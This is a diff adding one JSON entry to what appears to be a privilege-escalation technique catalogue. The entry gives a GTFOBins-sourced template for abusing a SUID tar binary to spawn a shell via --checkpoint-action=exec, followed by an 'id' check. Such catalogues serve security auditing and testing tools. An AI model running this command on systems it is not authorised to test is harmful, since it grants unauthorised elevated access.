@@ -1,0 +1,1 @@
+{"id":"suid_tar","category":"SUID_GTFOBINS","binary":"tar","cve":null,"exploitation":["{{binary}} -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec={{shell}}"],"post_exploit":["id"],"source":"gtfobins.github.io","tags":["suid","gtfobins"],"severity":"high"}
